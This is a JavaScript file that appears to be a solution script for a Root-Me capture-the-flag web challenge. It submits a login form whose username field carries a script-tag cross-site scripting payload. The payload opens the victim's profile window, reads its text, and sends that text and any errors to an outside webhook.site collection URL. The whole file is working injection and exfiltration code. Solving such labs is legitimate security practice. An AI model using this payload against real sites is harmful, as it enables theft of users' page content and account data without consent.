const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
const LOGIN = "http://challenge01.root-me.org:58003/login";
const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";
const OPEN = "rootme";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

function imgEnd() {
  document.location = WEBHOOK;
  document.location = PROFILE;
}

// const queryString = window.location.search;
// const urlParams = new URLSearchParams(queryString);
// const id = urlParams.get("id");

try {
  window.open(PROFILE, OPEN);

  const payload = `
function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

try {
  post("${WEBHOOK}", "profile");
  const profile = window.open("", "${OPEN}");
  window.location = "${WEBHOOK}?" + profile.document.body.innerText;
} catch (error) {
  post("${WEBHOOK}", error);
}
`;
  document.getElementById("username").value = `<script>${payload}</script>`;
  document.getElementById("login").submit();

  setTimeout(() => imgEnd(), 2000);
} catch (error) {
  post(WEBHOOK, `Error: ${error}`);
}
